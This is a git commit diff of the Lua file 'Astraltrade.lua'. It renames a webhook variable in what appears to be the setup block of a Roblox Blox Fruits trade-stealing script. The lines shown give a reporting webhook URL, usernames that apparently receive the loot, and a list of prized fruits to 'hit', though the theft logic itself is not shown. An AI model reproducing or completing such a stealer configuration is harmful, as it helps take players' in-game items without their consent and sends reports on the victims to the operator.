ad3bf87ccbfc15b312efbd7ac530534c51e55596
realredv4 <kazukikavdo@gmail.com>
2025-03-11 22:10:20 +0545

    Update Astraltrade.lua

--- Astraltrade.lua
+++ Astraltrade.lua
@@ -1,4 +1,4 @@
-okWebhook = "https://webhook-protect.vercel.app/api/webhook?id=UEVwUElhVWJ3MVh6VmszaDNXQVdzQTpncjRwMTR6aXRLN0p6OHg2LVA3NUg0dTd4aEZxajR4QTdtdzVwb1BfLWpYcmU5SXZtNVZnTXFuSVZGY281TXBQdWJPTjRfOHlLYmsxU3RWVTFrZmJmdVhoUWNnbnU0Z2xaSEh0OFlWV2hYbjRHZ2hCSEVNdXNsSjI5OVA2X0h0N2w1c2JLMXQyRWN4M01yLTh1cUV0TEM4U0dhcjVDbkFFZGFBT2tYaE1uRUU" -- << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UEVwUElhVWJ3MVh6VmszaDNXQVdzQTpncjRwMTR6aXRLN0p6OHg2LVA3NUg0dTd4aEZxajR4QTdtdzVwb1BfLWpYcmU5SXZtNVZnTXFuSVZGY281TXBQdWJPTjRfOHlLYmsxU3RWVTFrZmJmdVhoUWNnbnU0Z2xaSEh0OFlWV2hYbjRHZ2hCSEVNdXNsSjI5OVA2X0h0N2w1c2JLMXQyRWN4M01yLTh1cUV0TEM4U0dhcjVDbkFFZGFBT2tYaE1uRUU" -- << Your Webhook
 Usernames = {"aayush001116789", "sayam0011536", "sayam7682762"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon", "Dough-Dough"} -- << Fruits you want
 
